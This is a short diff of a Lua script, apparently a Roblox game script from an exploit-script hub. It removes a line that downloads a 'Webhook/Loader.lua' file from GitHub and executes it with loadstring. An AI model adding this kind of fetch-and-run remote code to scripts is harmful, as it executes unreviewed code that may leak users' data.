@@ -43,12 +43,6 @@ Notification:Notify(
 
 
 
--- settings
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/InfinityHubTwo/InfinityHubScripts/main/Games/Stands%20Awakening/Webhook/Loader.lua'))();
-
-
-
-
 -- variables
 local plr = game:GetService("Players").LocalPlayer
 local plrId = plr.UserId
